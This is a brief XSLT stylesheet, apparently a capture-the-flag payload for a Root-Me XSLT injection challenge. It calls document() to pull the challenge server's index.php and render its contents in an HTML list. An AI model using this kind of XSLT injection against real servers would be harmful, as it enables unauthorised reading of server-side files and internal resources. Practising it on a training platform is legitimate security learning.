<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
	<html>
		<body>
			<h3>BRUH</h3>
			<ul>
				<li>
					<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')" />
				</li>
			</ul>
		</body>
	</html>
</xsl:template>
</xsl:stylesheet>
